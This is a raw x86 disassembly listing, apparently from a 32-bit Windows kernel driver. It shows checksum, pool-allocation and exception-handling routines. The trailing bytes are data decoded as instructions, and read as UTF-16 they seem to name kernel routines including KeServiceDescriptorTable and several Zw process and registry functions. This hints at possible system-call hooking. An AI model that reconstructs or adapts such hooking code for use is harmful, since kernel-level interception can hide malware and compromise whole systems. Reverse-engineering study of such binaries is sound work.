   1d911:	shr    ebx,0x18
   1d914:	xor    eax,DWORD PTR [ebx*4+0x7bff0]
   1d91b:	and    edx,ecx
   1d91d:	xor    eax,DWORD PTR [edx*4+0x7cbf0]
   1d924:	dec    DWORD PTR [ebp-0x4]
   1d927:	jne    0x1d778
   1d92d:	cmp    DWORD PTR [ebp+0x8],edi
   1d930:	jb     0x1d97a
   1d932:	mov    edx,DWORD PTR [ebp+0x8]
   1d935:	shr    edx,0x2
   1d938:	mov    DWORD PTR [ebp-0x4],edx
   1d93b:	xor    eax,DWORD PTR [esi]
   1d93d:	sub    DWORD PTR [ebp+0x8],edi
   1d940:	mov    edx,eax
   1d942:	shr    edx,0x10
   1d945:	and    edx,ecx
   1d947:	mov    edx,DWORD PTR [edx*4+0x7c3f0]
   1d94e:	mov    ebx,eax
   1d950:	shr    ebx,0x8
   1d953:	and    ebx,ecx
   1d955:	xor    edx,DWORD PTR [ebx*4+0x7c7f0]
   1d95c:	mov    ebx,eax
   1d95e:	shr    ebx,0x18
   1d961:	xor    edx,DWORD PTR [ebx*4+0x7bff0]
   1d968:	and    eax,ecx
   1d96a:	xor    edx,DWORD PTR [eax*4+0x7cbf0]
   1d971:	add    esi,edi
   1d973:	dec    DWORD PTR [ebp-0x4]
   1d976:	mov    eax,edx
   1d978:	jne    0x1d93b
   1d97a:	cmp    DWORD PTR [ebp+0x8],0x0
   1d97e:	pop    edi
   1d97f:	pop    ebx
   1d980:	je     0x1d999
   1d982:	movzx  edx,BYTE PTR [esi]
   1d985:	xor    edx,eax
   1d987:	and    edx,ecx
   1d989:	shr    eax,0x8
   1d98c:	xor    eax,DWORD PTR [edx*4+0x7bff0]
   1d993:	inc    esi
   1d994:	dec    DWORD PTR [ebp+0x8]
   1d997:	jne    0x1d982
   1d999:	not    eax
   1d99b:	pop    esi
   1d99c:	leave  
   1d99d:	ret    0x4
   1d9a0:	int3   
   1d9a1:	int3   
   1d9a2:	int3   
   1d9a3:	int3   
   1d9a4:	int3   
   1d9a5:	int3   
   1d9a6:	mov    edi,edi
   1d9a8:	push   ebp
   1d9a9:	mov    ebp,esp
   1d9ab:	mov    edx,DWORD PTR [ebp+0xc]
   1d9ae:	test   edx,edx
   1d9b0:	jne    0x1d9b6
   1d9b2:	xor    eax,eax
   1d9b4:	jmp    0x1d9c1
   1d9b6:	push   DWORD PTR [ebp+0x10]
   1d9b9:	mov    eax,DWORD PTR [ebp+0x8]
   1d9bc:	call   0x1d72e
   1d9c1:	pop    ebp
   1d9c2:	ret    0xc
   1d9c5:	int3   
   1d9c6:	int3   
   1d9c7:	int3   
   1d9c8:	int3   
   1d9c9:	int3   
   1d9ca:	mov    edi,edi
   1d9cc:	push   ebp
   1d9cd:	mov    ebp,esp
   1d9cf:	push   0x20
   1d9d1:	push   0x61737973
   1d9d6:	push   DWORD PTR [ebp+0x8]
   1d9d9:	push   0x1
   1d9db:	call   DWORD PTR ds:0x1ee18
   1d9e1:	test   eax,eax
   1d9e3:	jne    0x1d9f0
   1d9e5:	push   0xc000009a
   1d9ea:	call   DWORD PTR ds:0x1ee14
   1d9f0:	pop    ebp
   1d9f1:	ret    
   1d9f2:	int3   
   1d9f3:	int3   
   1d9f4:	int3   
   1d9f5:	int3   
   1d9f6:	int3   
   1d9f7:	int3   
   1d9f8:	mov    edi,edi
   1d9fa:	push   ebp
   1d9fb:	mov    ebp,esp
   1d9fd:	cmp    DWORD PTR [ebp+0x8],0x0
   1da01:	je     0x1da0e
   1da03:	push   0x0
   1da05:	push   DWORD PTR [ebp+0x8]
   1da08:	call   DWORD PTR ds:0x1ee1c
   1da0e:	pop    ebp
   1da0f:	ret    
   1da10:	int3   
   1da11:	int3   
   1da12:	int3   
   1da13:	int3   
   1da14:	int3   
   1da15:	cmp    ecx,DWORD PTR ds:0x7e528
   1da1b:	jne    0x1da20
   1da1d:	ret    0x0
   1da20:	jmp    0x1da2a
   1da25:	int3   
   1da26:	int3   
   1da27:	int3   
   1da28:	int3   
   1da29:	int3   
   1da2a:	mov    edi,edi
   1da2c:	push   ebp
   1da2d:	mov    ebp,esp
   1da2f:	push   ecx
   1da30:	mov    DWORD PTR [ebp-0x4],ecx
   1da33:	push   0x0
   1da35:	push   DWORD PTR ds:0x7e52c
   1da3b:	push   DWORD PTR ds:0x7e528
   1da41:	push   DWORD PTR [ebp-0x4]
   1da44:	push   0xf7
   1da49:	call   DWORD PTR ds:0x1ee5c
   1da4f:	int3   
   1da50:	int3   
   1da51:	int3   
   1da52:	int3   
   1da53:	int3   
   1da54:	int3   
   1da55:	int3   
   1da56:	jmp    DWORD PTR ds:0x1ee08
   1da5c:	int3   
   1da5d:	int3   
   1da5e:	int3   
   1da5f:	int3   
   1da60:	int3   
   1da61:	int3   
   1da62:	jmp    DWORD PTR ds:0x1ee0c
   1da68:	int3   
   1da69:	int3   
   1da6a:	int3   
   1da6b:	int3   
   1da6c:	int3   
   1da6d:	int3   
   1da6e:	jmp    DWORD PTR ds:0x1ee10
   1da74:	int3   
   1da75:	int3   
   1da76:	int3   
   1da77:	int3   
   1da78:	int3   
   1da79:	int3   
   1da7a:	jmp    DWORD PTR ds:0x1ee30
   1da80:	int3   
   1da81:	int3   
   1da82:	int3   
   1da83:	int3   
   1da84:	int3   
   1da85:	int3   
   1da86:	jmp    DWORD PTR ds:0x1ee38
   1da8c:	int3   
   1da8d:	int3   
   1da8e:	int3   
   1da8f:	int3   
   1da90:	int3   
   1da91:	int3   
   1da92:	jmp    DWORD PTR ds:0x1ee3c
   1da98:	int3   
   1da99:	int3   
   1da9a:	int3   
   1da9b:	int3   
   1da9c:	int3   
   1da9d:	int3   
   1da9e:	jmp    DWORD PTR ds:0x1ee48
   1daa4:	int3   
   1daa5:	int3   
   1daa6:	int3   
   1daa7:	int3   
   1daa8:	int3   
   1daa9:	int3   
   1daaa:	jmp    DWORD PTR ds:0x1ee50
   1dab0:	int3   
   1dab1:	int3   
   1dab2:	int3   
   1dab3:	int3   
   1dab4:	int3   
   1dab5:	int3   
   1dab6:	int3   
   1dab7:	int3   
   1dab8:	push   0x1db20
   1dabd:	push   DWORD PTR fs:0x0
   1dac4:	mov    eax,DWORD PTR [esp+0x10]
   1dac8:	mov    DWORD PTR [esp+0x10],ebp
   1dacc:	lea    ebp,[esp+0x10]
   1dad0:	sub    esp,eax
   1dad2:	push   ebx
   1dad3:	push   esi
   1dad4:	push   edi
   1dad5:	mov    eax,ds:0x7e528
   1dada:	xor    DWORD PTR [ebp-0x4],eax
   1dadd:	xor    eax,ebp
   1dadf:	push   eax
   1dae0:	mov    DWORD PTR [ebp-0x18],esp
   1dae3:	push   DWORD PTR [ebp-0x8]
   1dae6:	mov    eax,DWORD PTR [ebp-0x4]
   1dae9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1daf0:	mov    DWORD PTR [ebp-0x8],eax
   1daf3:	lea    eax,[ebp-0x10]
   1daf6:	mov    fs:0x0,eax
   1dafc:	ret    
   1dafd:	mov    ecx,DWORD PTR [ebp-0x10]
   1db00:	mov    DWORD PTR fs:0x0,ecx
   1db07:	pop    ecx
   1db08:	pop    edi
   1db09:	pop    edi
   1db0a:	pop    esi
   1db0b:	pop    ebx
   1db0c:	mov    esp,ebp
   1db0e:	pop    ebp
   1db0f:	push   ecx
   1db10:	ret    
   1db11:	int3   
   1db12:	int3   
   1db13:	int3   
   1db14:	int3   
   1db15:	int3   
   1db16:	int3   
   1db17:	int3   
   1db18:	int3   
   1db19:	int3   
   1db1a:	int3   
   1db1b:	int3   
   1db1c:	int3   
   1db1d:	int3   
   1db1e:	int3   
   1db1f:	int3   
   1db20:	mov    edi,edi
   1db22:	push   ebp
   1db23:	mov    ebp,esp
   1db25:	sub    esp,0x14
   1db28:	push   ebx
   1db29:	mov    ebx,DWORD PTR [ebp+0xc]
   1db2c:	push   esi
   1db2d:	mov    esi,DWORD PTR [ebx+0x8]
   1db30:	xor    esi,DWORD PTR ds:0x7e528
   1db36:	push   edi
   1db37:	mov    eax,DWORD PTR [esi]
   1db39:	mov    BYTE PTR [ebp-0x1],0x0
   1db3d:	mov    DWORD PTR [ebp-0x8],0x1
   1db44:	lea    edi,[ebx+0x10]
   1db47:	cmp    eax,0xfffffffe
   1db4a:	je     0x1db59
   1db4c:	mov    ecx,DWORD PTR [esi+0x4]
   1db4f:	add    ecx,edi
   1db51:	xor    ecx,DWORD PTR [eax+edi*1]
   1db54:	call   0x1da15
   1db59:	mov    ecx,DWORD PTR [esi+0xc]
   1db5c:	mov    eax,DWORD PTR [esi+0x8]
   1db5f:	add    ecx,edi
   1db61:	xor    ecx,DWORD PTR [eax+edi*1]
   1db64:	call   0x1da15
   1db69:	mov    eax,DWORD PTR [ebp+0x8]
   1db6c:	test   BYTE PTR [eax+0x4],0x66
   1db70:	jne    0x1dc58
   1db76:	mov    ecx,DWORD PTR [ebp+0x10]
   1db79:	lea    edx,[ebp-0x14]
   1db7c:	mov    DWORD PTR [ebx-0x4],edx
   1db7f:	mov    ebx,DWORD PTR [ebx+0xc]
   1db82:	mov    DWORD PTR [ebp-0x14],eax
   1db85:	mov    DWORD PTR [ebp-0x10],ecx
   1db88:	cmp    ebx,0xfffffffe
   1db8b:	je     0x1dbec
   1db8d:	lea    ecx,[ecx+0x0]
   1db90:	lea    eax,[ebx+ebx*2]
   1db93:	mov    ecx,DWORD PTR [esi+eax*4+0x14]
   1db97:	lea    eax,[esi+eax*4+0x10]
   1db9b:	mov    DWORD PTR [ebp-0xc],eax
   1db9e:	mov    eax,DWORD PTR [eax]
   1dba0:	mov    DWORD PTR [ebp+0x8],eax
   1dba3:	test   ecx,ecx
   1dba5:	je     0x1dbbb
   1dba7:	mov    edx,edi
   1dba9:	call   0x1dd61
   1dbae:	mov    BYTE PTR [ebp-0x1],0x1
   1dbb2:	test   eax,eax
   1dbb4:	jl     0x1dbf6
   1dbb6:	jg     0x1dbff
   1dbb8:	mov    eax,DWORD PTR [ebp+0x8]
   1dbbb:	mov    ebx,eax
   1dbbd:	cmp    eax,0xfffffffe
   1dbc0:	jne    0x1db90
   1dbc2:	cmp    BYTE PTR [ebp-0x1],0x0
   1dbc6:	je     0x1dbec
   1dbc8:	mov    eax,DWORD PTR [esi]
   1dbca:	cmp    eax,0xfffffffe
   1dbcd:	je     0x1dbdc
   1dbcf:	mov    ecx,DWORD PTR [esi+0x4]
   1dbd2:	add    ecx,edi
   1dbd4:	xor    ecx,DWORD PTR [eax+edi*1]
   1dbd7:	call   0x1da15
   1dbdc:	mov    ecx,DWORD PTR [esi+0xc]
   1dbdf:	mov    edx,DWORD PTR [esi+0x8]
   1dbe2:	add    ecx,edi
   1dbe4:	xor    ecx,DWORD PTR [edx+edi*1]
   1dbe7:	call   0x1da15
   1dbec:	mov    eax,DWORD PTR [ebp-0x8]
   1dbef:	pop    edi
   1dbf0:	pop    esi
   1dbf1:	pop    ebx
   1dbf2:	mov    esp,ebp
   1dbf4:	pop    ebp
   1dbf5:	ret    
   1dbf6:	mov    DWORD PTR [ebp-0x8],0x0
   1dbfd:	jmp    0x1dbc8
   1dbff:	mov    ecx,DWORD PTR [ebp+0xc]
   1dc02:	call   0x1dd8a
   1dc07:	mov    eax,DWORD PTR [ebp+0xc]
   1dc0a:	cmp    DWORD PTR [eax+0xc],ebx
   1dc0d:	je     0x1dc21
   1dc0f:	push   0x7e528
   1dc14:	push   edi
   1dc15:	mov    edx,ebx
   1dc17:	mov    ecx,eax
   1dc19:	call   0x1dda4
   1dc1e:	mov    eax,DWORD PTR [ebp+0xc]
   1dc21:	mov    ecx,DWORD PTR [ebp+0x8]
   1dc24:	mov    DWORD PTR [eax+0xc],ecx
   1dc27:	mov    eax,DWORD PTR [esi]
   1dc29:	cmp    eax,0xfffffffe
   1dc2c:	je     0x1dc3b
   1dc2e:	mov    ecx,DWORD PTR [esi+0x4]
   1dc31:	add    ecx,edi
   1dc33:	xor    ecx,DWORD PTR [eax+edi*1]
   1dc36:	call   0x1da15
   1dc3b:	mov    ecx,DWORD PTR [esi+0xc]
   1dc3e:	mov    edx,DWORD PTR [esi+0x8]
   1dc41:	add    ecx,edi
   1dc43:	xor    ecx,DWORD PTR [edx+edi*1]
   1dc46:	call   0x1da15
   1dc4b:	mov    eax,DWORD PTR [ebp-0xc]
   1dc4e:	mov    ecx,DWORD PTR [eax+0x8]
   1dc51:	mov    edx,edi
   1dc53:	call   0x1dd78
   1dc58:	mov    edx,0xfffffffe
   1dc5d:	cmp    DWORD PTR [ebx+0xc],edx
   1dc60:	je     0x1dbec
   1dc62:	push   0x7e528
   1dc67:	push   edi
   1dc68:	mov    ecx,ebx
   1dc6a:	call   0x1dda4
   1dc6f:	jmp    0x1dbc8
   1dc74:	int3   
   1dc75:	int3   
   1dc76:	int3   
   1dc77:	int3   
   1dc78:	int3   
   1dc79:	int3   
   1dc7a:	int3   
   1dc7b:	int3   
   1dc7c:	push   ebx
   1dc7d:	push   esi
   1dc7e:	push   edi
   1dc7f:	mov    edx,DWORD PTR [esp+0x10]
   1dc83:	mov    eax,DWORD PTR [esp+0x14]
   1dc87:	mov    ecx,DWORD PTR [esp+0x18]
   1dc8b:	push   ebp
   1dc8c:	push   edx
   1dc8d:	push   eax
   1dc8e:	push   ecx
   1dc8f:	push   ecx
   1dc90:	push   0x1dcff
   1dc95:	push   DWORD PTR fs:0x0
   1dc9c:	mov    eax,ds:0x7e528
   1dca1:	xor    eax,esp
   1dca3:	mov    DWORD PTR [esp+0x8],eax
   1dca7:	mov    DWORD PTR fs:0x0,esp
   1dcae:	mov    eax,DWORD PTR [esp+0x30]
   1dcb2:	mov    ebx,DWORD PTR [eax+0x8]
   1dcb5:	mov    ecx,DWORD PTR [esp+0x2c]
   1dcb9:	xor    ebx,DWORD PTR [ecx]
   1dcbb:	mov    esi,DWORD PTR [eax+0xc]
   1dcbe:	cmp    esi,0xfffffffe
   1dcc1:	je     0x1dcf1
   1dcc3:	mov    edx,DWORD PTR [esp+0x34]
   1dcc7:	cmp    edx,0xfffffffe
   1dcca:	je     0x1dcd0
   1dccc:	cmp    esi,edx
   1dcce:	jbe    0x1dcf1
   1dcd0:	lea    esi,[esi+esi*2]
   1dcd3:	lea    ebx,[ebx+esi*4+0x10]
   1dcd7:	mov    ecx,DWORD PTR [ebx]
   1dcd9:	mov    DWORD PTR [eax+0xc],ecx
   1dcdc:	cmp    DWORD PTR [ebx+0x4],0x0
   1dce0:	jne    0x1dcae
   1dce2:	mov    ecx,0x1
   1dce7:	mov    eax,DWORD PTR [ebx+0x8]
   1dcea:	call   0x1de1c
   1dcef:	jmp    0x1dcae
   1dcf1:	pop    DWORD PTR fs:0x0
   1dcf8:	add    esp,0x18
   1dcfb:	pop    edi
   1dcfc:	pop    esi
   1dcfd:	pop    ebx
   1dcfe:	ret    
   1dcff:	mov    ecx,DWORD PTR [esp+0x4]
   1dd03:	test   DWORD PTR [ecx+0x4],0x6
   1dd0a:	mov    eax,0x1
   1dd0f:	je     0x1dd44
   1dd11:	mov    eax,DWORD PTR [esp+0x8]
   1dd15:	mov    ecx,DWORD PTR [eax+0x8]
   1dd18:	xor    ecx,eax
   1dd1a:	call   0x1da15
   1dd1f:	push   ebp
   1dd20:	mov    ebp,DWORD PTR [eax+0x18]
   1dd23:	push   DWORD PTR [eax+0xc]
   1dd26:	push   DWORD PTR [eax+0x10]
   1dd29:	push   DWORD PTR [eax+0x14]
   1dd2c:	call   0x1dc7c
   1dd31:	add    esp,0xc
   1dd34:	pop    ebp
   1dd35:	mov    eax,DWORD PTR [esp+0x8]
   1dd39:	mov    edx,DWORD PTR [esp+0x10]
   1dd3d:	mov    DWORD PTR [edx],eax
   1dd3f:	mov    eax,0x3
   1dd44:	ret    
   1dd45:	push   ebp
   1dd46:	mov    ecx,DWORD PTR [esp+0x8]
   1dd4a:	mov    ebp,DWORD PTR [ecx]
   1dd4c:	push   DWORD PTR [ecx+0x1c]
   1dd4f:	push   DWORD PTR [ecx+0x18]
   1dd52:	push   DWORD PTR [ecx+0x28]
   1dd55:	call   0x1dc7c
   1dd5a:	add    esp,0xc
   1dd5d:	pop    ebp
   1dd5e:	ret    0x4
   1dd61:	push   ebp
   1dd62:	push   esi
   1dd63:	push   edi
   1dd64:	push   ebx
   1dd65:	mov    ebp,edx
   1dd67:	xor    eax,eax
   1dd69:	xor    ebx,ebx
   1dd6b:	xor    edx,edx
   1dd6d:	xor    esi,esi
   1dd6f:	xor    edi,edi
   1dd71:	call   ecx
   1dd73:	pop    ebx
   1dd74:	pop    edi
   1dd75:	pop    esi
   1dd76:	pop    ebp
   1dd77:	ret    
   1dd78:	mov    ebp,edx
   1dd7a:	mov    esi,ecx
   1dd7c:	mov    eax,ecx
   1dd7e:	xor    eax,eax
   1dd80:	xor    ebx,ebx
   1dd82:	xor    ecx,ecx
   1dd84:	xor    edx,edx
   1dd86:	xor    edi,edi
   1dd88:	jmp    esi
   1dd8a:	push   ebp
   1dd8b:	mov    ebp,esp
   1dd8d:	push   ebx
   1dd8e:	push   esi
   1dd8f:	push   edi
   1dd90:	push   0x0
   1dd92:	push   0x0
   1dd94:	push   0x1dd9f
   1dd99:	push   ecx
   1dd9a:	call   0x1de24
   1dd9f:	pop    edi
   1dda0:	pop    esi
   1dda1:	pop    ebx
   1dda2:	pop    ebp
   1dda3:	ret    
   1dda4:	push   ebp
   1dda5:	mov    ebp,DWORD PTR [esp+0x8]
   1dda9:	push   edx
   1ddaa:	push   ecx
   1ddab:	push   DWORD PTR [esp+0x14]
   1ddaf:	call   0x1dc7c
   1ddb4:	add    esp,0xc
   1ddb7:	pop    ebp
   1ddb8:	ret    0x8
   1ddbb:	int3   
   1ddbc:	int3   
   1ddbd:	int3   
   1ddbe:	int3   
   1ddbf:	int3   
   1ddc0:	push   0x1db20
   1ddc5:	push   DWORD PTR fs:0x0
   1ddcc:	mov    eax,DWORD PTR [esp+0x10]
   1ddd0:	mov    DWORD PTR [esp+0x10],ebp
   1ddd4:	lea    ebp,[esp+0x10]
   1ddd8:	sub    esp,eax
   1ddda:	push   ebx
   1dddb:	push   esi
   1dddc:	push   edi
   1dddd:	mov    eax,ds:0x7e528
   1dde2:	xor    DWORD PTR [ebp-0x4],eax
   1dde5:	xor    eax,ebp
   1dde7:	mov    DWORD PTR [ebp-0x1c],eax
   1ddea:	push   eax
   1ddeb:	mov    DWORD PTR [ebp-0x18],esp
   1ddee:	push   DWORD PTR [ebp-0x8]
   1ddf1:	mov    eax,DWORD PTR [ebp-0x4]
   1ddf4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1ddfb:	mov    DWORD PTR [ebp-0x8],eax
   1ddfe:	lea    eax,[ebp-0x10]
   1de01:	mov    fs:0x0,eax
   1de07:	ret    
   1de08:	mov    ecx,DWORD PTR [ebp-0x1c]
   1de0b:	xor    ecx,ebp
   1de0d:	call   0x1da15
   1de12:	jmp    0x1dafd
   1de17:	int3   
   1de18:	int3   
   1de19:	int3   
   1de1a:	int3   
   1de1b:	int3   
   1de1c:	call   eax
   1de1e:	ret    
   1de1f:	int3   
   1de20:	int3   
   1de21:	int3   
   1de22:	int3   
   1de23:	int3   
   1de24:	jmp    DWORD PTR ds:0x1ee68
   1de2a:	pop    esp
   1de2b:	add    BYTE PTR [eax],al
   1de2d:	add    BYTE PTR [eax],al
   1de2f:	add    BYTE PTR [ebx+0x0],ch
   1de32:	bound  eax,QWORD PTR [eax]
   1de34:	add    BYTE PTR fs:[ecx+0x0],dh
   1de38:	add    BYTE PTR [eax],al
   1de3a:	add    BYTE PTR fs:[ebx],dh
   1de3d:	add    BYTE PTR [eax+eax*1+0x73],ah
   1de41:	add    BYTE PTR [eax],al
   1de43:	add    BYTE PTR [esi+0x0],ch
   1de46:	je     0x1de48
   1de48:	outs   dx,BYTE PTR ds:[esi]
   1de49:	add    BYTE PTR [eax],al
   1de4b:	add    BYTE PTR [ebx+0x0],dh
   1de4e:	jns    0x1de50
   1de50:	jae    0x1de52
   1de52:	popa   
   1de53:	add    BYTE PTR [eax],al
   1de55:	add    BYTE PTR [edi+0x0],dh
   1de58:	imul   eax,DWORD PTR [eax],0x65006e
   1de5e:	add    BYTE PTR [eax],al
   1de60:	jo     0x1de62
   1de62:	arpl   WORD PTR [eax],ax
   1de64:	imul   eax,DWORD PTR [eax],0x6d0000
   1de6a:	jae    0x1de6c
   1de6c:	jb     0x1de6e
   1de6e:	add    BYTE PTR [eax],al
   1de70:	je     0x1de72
   1de72:	ins    DWORD PTR es:[edi],dx
   1de73:	add    BYTE PTR [eax+0x0],dh
   1de76:	add    BYTE PTR [eax],al
   1de78:	jne    0x1de7a
   1de7a:	jae    0x1de7c
   1de7c:	bound  eax,QWORD PTR [eax]
   1de7e:	add    BYTE PTR [eax],al
   1de80:	outs   dx,DWORD PTR ds:[esi]
   1de81:	add    BYTE PTR [eax+eax*1+0x65],ch
   1de85:	add    BYTE PTR [eax],al
   1de87:	add    BYTE PTR [ecx+0x0],ah
   1de8a:	imul   eax,DWORD PTR [eax],0x70
   1de90:	push   0x0
   1de92:	popa   
   1de93:	add    BYTE PTR [ecx+0x0],bh
   1de96:	add    BYTE PTR [eax],al
   1de98:	jbe    0x1de9a
   1de9a:	add    BYTE PTR gs:[edx+0x0],dh
   1de9e:	add    BYTE PTR [eax],al
   1dea0:	jae    0x1dea2
   1dea2:	popa   
   1dea3:	add    BYTE PTR [ecx+0x0],ch
   1dea6:	add    BYTE PTR [eax],al
   1dea8:	ins    BYTE PTR es:[edi],dx
   1dea9:	add    BYTE PTR [ecx+0x0],ah
   1deac:	arpl   WORD PTR [eax],ax
   1deae:	add    BYTE PTR [eax],al
   1deb0:	push   0x0
   1deb2:	jo     0x1deb4
   1deb4:	add    BYTE PTR [bx+si],al
   1deb7:	add    BYTE PTR [eax+0x0],ch
   1deba:	imul   eax,DWORD PTR [eax],0x64
   1dec0:	jo     0x1dec2
   1dec2:	outs   dx,BYTE PTR ds:[esi]
   1dec3:	add    BYTE PTR [edi+0x0],ah
   1dec6:	add    BYTE PTR [eax],al
   1dec8:	outs   dx,BYTE PTR ds:[esi]
   1dec9:	add    BYTE PTR [eax+eax*1+0x71],dh
   1decd:	add    BYTE PTR [eax],al
   1decf:	add    BYTE PTR [eax],al
   1ded1:	int3   
   1ded2:	dec    ebx
   1ded3:	add    BYTE PTR [ebp+0x0],ah
   1ded6:	push   ebx
   1ded7:	add    BYTE PTR [ebp+0x0],ah
   1deda:	jb     0x1dedc
   1dedc:	jbe    0x1dede
   1dede:	imul   eax,DWORD PTR [eax],0x650063
   1dee4:	inc    esp
   1dee5:	add    BYTE PTR [ebp+0x0],ah
   1dee8:	jae    0x1deea
   1deea:	arpl   WORD PTR [eax],ax
   1deec:	jb     0x1deee
   1deee:	imul   eax,DWORD PTR [eax],0x740070
   1def4:	outs   dx,DWORD PTR ds:[esi]
   1def5:	add    BYTE PTR [edx+0x0],dh
   1def8:	push   esp
   1def9:	add    BYTE PTR [ecx+0x0],ah
   1defc:	bound  eax,QWORD PTR [eax]
   1defe:	ins    BYTE PTR es:[edi],dx
   1deff:	add    BYTE PTR [ebp+0x0],ah
   1df02:	add    BYTE PTR [eax],al
   1df04:	pop    edx
   1df05:	add    BYTE PTR [edi+0x0],dh
   1df08:	dec    edi
   1df09:	add    BYTE PTR [eax+0x0],dh
   1df0c:	add    BYTE PTR gs:[esi+0x0],ch
   1df10:	push   eax
   1df11:	add    BYTE PTR [edx+0x0],dh
   1df14:	outs   dx,DWORD PTR ds:[esi]
   1df15:	add    BYTE PTR [ebx+0x0],ah
   1df18:	add    BYTE PTR gs:[ebx+0x0],dh
   1df1c:	jae    0x1df1e
   1df1e:	add    BYTE PTR [eax],al
   1df20:	push   eax
   1df21:	add    BYTE PTR [ebx+0x0],dh
   1df24:	push   ebx
   1df25:	add    BYTE PTR [ebp+0x0],ah
   1df28:	je     0x1df2a
   1df2a:	dec    esp
   1df2b:	add    BYTE PTR [edi+0x0],ch
   1df2e:	popa   
   1df2f:	add    BYTE PTR [eax+eax*1+0x49],ah
   1df33:	add    BYTE PTR [ebp+0x0],ch
   1df36:	popa   
   1df37:	add    BYTE PTR [edi+0x0],ah
   1df3a:	add    BYTE PTR gs:[esi+0x0],cl
   1df3e:	outs   dx,DWORD PTR ds:[esi]
   1df3f:	add    BYTE PTR [eax+eax*1+0x69],dh
   1df43:	add    BYTE PTR [esi+0x0],ah
   1df46:	jns    0x1df48
   1df48:	push   edx
   1df49:	add    BYTE PTR [edi+0x0],ch
   1df4c:	jne    0x1df4e
   1df4e:	je     0x1df50
   1df50:	imul   eax,DWORD PTR [eax],0x65006e
   1df56:	add    BYTE PTR [eax],al
   1df58:	pop    edx
   1df59:	add    BYTE PTR [edi+0x0],dh
   1df5c:	inc    esp
   1df5d:	add    BYTE PTR [ebp+0x0],dh
   1df60:	jo     0x1df62
   1df62:	ins    BYTE PTR es:[edi],dx
   1df63:	add    BYTE PTR [ecx+0x0],ch
   1df66:	arpl   WORD PTR [eax],ax
   1df68:	popa   
   1df69:	add    BYTE PTR [eax+eax*1+0x65],dh
   1df6d:	add    BYTE PTR [eax+eax*1+0x6f],dl
   1df71:	add    BYTE PTR [ebx+0x0],ch
   1df74:	add    BYTE PTR gs:[esi+0x0],ch
   1df78:	add    BYTE PTR [eax],al
   1df7a:	push   eax
   1df7b:	add    BYTE PTR [ebx+0x0],dh
   1df7e:	push   ebx
   1df7f:	add    BYTE PTR [ebp+0x0],ah
   1df82:	je     0x1df84
   1df84:	inc    ebx
   1df85:	add    BYTE PTR [edx+0x0],dh
   1df88:	add    BYTE PTR gs:[ecx+0x0],ah
   1df8c:	je     0x1df8e
   1df8e:	add    BYTE PTR gs:[eax+0x0],dl
   1df92:	jb     0x1df94
   1df94:	outs   dx,DWORD PTR ds:[esi]
   1df95:	add    BYTE PTR [ebx+0x0],ah
   1df98:	add    BYTE PTR gs:[ebx+0x0],dh
   1df9c:	jae    0x1df9e
   1df9e:	dec    esi
   1df9f:	add    BYTE PTR [edi+0x0],ch
   1dfa2:	je     0x1dfa4
   1dfa4:	imul   eax,DWORD PTR [eax],0x790066
   1dfaa:	push   edx
   1dfab:	add    BYTE PTR [edi+0x0],ch
   1dfae:	jne    0x1dfb0
   1dfb0:	je     0x1dfb2
   1dfb2:	imul   eax,DWORD PTR [eax],0x65006e
   1dfb8:	add    BYTE PTR [eax],al
   1dfba:	pop    edx
   1dfbb:	add    BYTE PTR [edi+0x0],dh
   1dfbe:	dec    edi
   1dfbf:	add    BYTE PTR [eax+0x0],dh
   1dfc2:	add    BYTE PTR gs:[esi+0x0],ch
   1dfc6:	inc    esi
   1dfc7:	add    BYTE PTR [ecx+0x0],ch
   1dfca:	ins    BYTE PTR es:[edi],dx
   1dfcb:	add    BYTE PTR [ebp+0x0],ah
   1dfce:	add    BYTE PTR [eax],al
   1dfd0:	pop    edx
   1dfd1:	add    BYTE PTR [edi+0x0],dh
   1dfd4:	push   ecx
   1dfd5:	add    BYTE PTR [ebp+0x0],dh
   1dfd8:	add    BYTE PTR gs:[edx+0x0],dh
   1dfdc:	jns    0x1dfde
   1dfde:	dec    ecx
   1dfdf:	add    BYTE PTR [esi+0x0],ch
   1dfe2:	data16 add BYTE PTR [edi+0x0],ch
   1dfe6:	jb     0x1dfe8
   1dfe8:	ins    DWORD PTR es:[edi],dx
   1dfe9:	add    BYTE PTR [ecx+0x0],ah
   1dfec:	je     0x1dfee
   1dfee:	imul   eax,DWORD PTR [eax],0x6e006f
   1dff4:	push   eax
   1dff5:	add    BYTE PTR [edx+0x0],dh
   1dff8:	outs   dx,DWORD PTR ds:[esi]
   1dff9:	add    BYTE PTR [ebx+0x0],ah
   1dffc:	add    BYTE PTR gs:[ebx+0x0],dh
   1e000:	jae    0x1e002
   1e002:	add    BYTE PTR [eax],al
   1e004:	pop    edx
   1e005:	add    BYTE PTR [edi+0x0],dh
   1e008:	push   ecx
   1e009:	add    BYTE PTR [ebp+0x0],dh
   1e00c:	add    BYTE PTR gs:[edx+0x0],dh
   1e010:	jns    0x1e012
   1e012:	push   ebx
   1e013:	add    BYTE PTR [ecx+0x0],bh
   1e016:	jae    0x1e018
   1e018:	je     0x1e01a
   1e01a:	add    BYTE PTR gs:[ebp+0x0],ch
   1e01e:	dec    ecx
   1e01f:	add    BYTE PTR [esi+0x0],ch
   1e022:	data16 add BYTE PTR [edi+0x0],ch
   1e026:	jb     0x1e028
   1e028:	ins    DWORD PTR es:[edi],dx
   1e029:	add    BYTE PTR [ecx+0x0],ah
   1e02c:	je     0x1e02e
   1e02e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e034:	add    BYTE PTR [eax],al
   1e036:	pop    edx
   1e037:	add    BYTE PTR [edi+0x0],dh
   1e03a:	dec    edi
   1e03b:	add    BYTE PTR [eax+0x0],dh
   1e03e:	add    BYTE PTR gs:[esi+0x0],ch
   1e042:	dec    ebx
   1e043:	add    BYTE PTR [ebp+0x0],ah
   1e046:	jns    0x1e048
   1e048:	add    BYTE PTR [eax],al
   1e04a:	pop    edx
   1e04b:	add    BYTE PTR [edi+0x0],dh
   1e04e:	inc    esp
   1e04f:	add    BYTE PTR [ebp+0x0],ah
   1e052:	ins    BYTE PTR es:[edi],dx
   1e053:	add    BYTE PTR [ebp+0x0],ah
   1e056:	je     0x1e058
   1e058:	add    BYTE PTR gs:[ebx+0x0],cl
   1e05c:	add    BYTE PTR gs:[ecx+0x0],bh
   1e060:	add    BYTE PTR [eax],al
   1e062:	pop    edx
   1e063:	add    BYTE PTR [edi+0x0],dh
   1e066:	push   ebx
   1e067:	add    BYTE PTR [ebp+0x0],ah
   1e06a:	je     0x1e06c
   1e06c:	push   esi
